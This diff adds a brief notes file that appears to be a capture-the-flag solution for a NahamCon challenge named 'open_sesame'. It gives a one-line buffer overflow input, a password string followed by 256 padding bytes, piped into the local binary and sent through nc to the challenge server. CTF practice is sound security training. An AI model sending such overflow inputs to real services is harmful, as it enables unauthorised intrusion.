@@ -1,0 +1,6 @@
+Locally:
+  python -c 'print ("OpenSesame!!!" + "X"*256)'  | ./open_sesame
+
+Remote (XXXXX is TCP port number)
+  python -c 'print ("OpenSesame!!!" + "X"*256)'  | nc challenge.nahamcon.com XXXXX
+  
